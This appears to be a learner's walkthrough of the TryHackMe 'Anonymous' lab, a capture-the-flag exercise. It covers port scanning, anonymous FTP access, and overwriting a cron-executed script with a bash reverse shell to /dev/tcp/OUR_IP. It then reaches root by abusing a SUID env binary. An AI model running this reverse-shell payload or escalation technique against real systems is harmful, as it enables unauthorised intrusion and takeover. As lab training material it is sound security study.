In this capstone we will use:
- [https://tryhackme.com/r/room/anonymous](https://tryhackme.com/r/room/anonymous)

# Nmap scan
First of all we do a `nmap` scan:
```bash
nmap -T4 -p- -A HOST_IP
```
- ![[Pasted image 20250120122323.png]]
- we have many ports open


We start from `ftp`

# ftp port 21 enum
So we try to get info about ftp on the port 21

We start to access to `ftp` with the credentials `anonymous:anonymous`:
```bash
ftp HOST_IP
```
- ![[Pasted image 20250120122515.png]]

We are in, and we try to see which file we can access:
```bash
ls
```
- ![[Pasted image 20250120122545.png]]

We have a script folder that we look at:
- ![[Pasted image 20250120122609.png]]
- 3 files in it


So we pass all of them on our machine using the command:
```bash
mget *
```
- ![[Pasted image 20250120122650.png]]


> IMPORTANT: we can pass to binary mode in order to avoid problems on trasfering

```bash
binary 

mget *
```


At this point we have everything on our machine and we start to look at that:
```bash
cat to_do.txt
```
- ![[Pasted image 20250120122842.png]]

Then we cat the log file:
```bash
cat removed_files.log
```
- ![[Pasted image 20250120122907.png]]

But nothing to see...


So we look at the script:
```bash
cat clean.sh
```
- ![[Pasted image 20250120122955.png]]

But if we change this script content with a malicious one?
- It could work, because this script could be executed by a `cron` job

# Get a reverse shell

So we try to insert a reverse shell in it:
- [https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

We start with the bash one, we create a `clean.sh` file and we put in it:
```bash
#!/bin/bash

bash -i >& /dev/tcp/OUR_IP/7777 0>&1
```


At this point we run `nc` on our machine:
```bash
nc -nlvp 7777
```


## pass the new file to ftp

Now we need to pass our malicious file into the ftp server accessing as `anonymous:anonymous`:
```bash
ftp HOST_IP
```

So we go on the `/scripts` folder and we put the new file:
```bash
put clean.sh
```
- ![[Pasted image 20250120123527.png]]


Now we need to wait a little bit to be executed and:
- ![[Pasted image 20250120123553.png]]
- and we got a user shell


# Privilege escalation
At this point we start with our privesc enum.

# kernel
We do a system enumeration:
```bash
uname -a
```
- ![[Pasted image 20250120123645.png]]

# Sudo 
We try to use:
```bash
sudo -l
```
- ![[Pasted image 20250120123907.png]]
- But no tty found

So we can try to run `tty` looking at:
- [https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell](https://wiki.zacheller.dev/pentest/privilege-escalation/spawning-a-tty-shell)

So we run:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
- in our case `bash` because we are using it
- ![[Pasted image 20250120124103.png]]

So we run now:
```bash
sudo -l
```
- ![[Pasted image 20250120124119.png]]
- it asks for password


# SUID
At this point we try with `SUID` :
```bash
find / -perm -04000 -t f -ls 2>/dev/null
```
- ![[Pasted image 20250120124318.png]]

We can try with `env`:
- ![[Pasted image 20250120124341.png]]
- we search it on GTFOBins



So we run now as we saw in GTFOBins:
```bash
/usr/bin/env /bin/bash -p
```
- ![[Pasted image 20250120124448.png]]


We gain a root shell!